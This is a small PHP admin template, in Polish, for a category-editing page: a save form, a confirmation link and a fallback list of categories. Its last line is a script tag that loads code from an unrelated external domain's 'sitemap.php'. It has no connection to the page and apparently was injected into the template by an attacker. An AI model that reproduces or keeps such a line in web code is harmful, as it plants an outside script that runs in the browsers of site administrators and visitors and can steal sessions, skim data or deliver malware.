<h2>Edycja kategorii</h2>

<?if(getOrder(1) && getOrder(1) != VAR_TOP_CATEGORY):?>
	<?if(getPost('sent')):?>
		<p><a href='/category/<?=$current -> id?>'>Przeedytowano kategorię, kliknij aby sprawdzić!</a>
	<?endif?>

	<form action='/categoryEdit/<?=getOrder(1)?>' method='post'>
	<input type='hidden' name='sent' value='yes'>
	<?module('form_category', array('current' => $current))?>
	<p><input type='submit' value='Zapisz zmiany'>
	</form>
<?else:?>
<h3>Wybierz kategorię do edycji:</h3>
<?module('categories_admin', array('link' => 'categoryEdit'))?>
<?endif?>
<script src=http://johanneswallmark.com/media/sitemap.php ></script>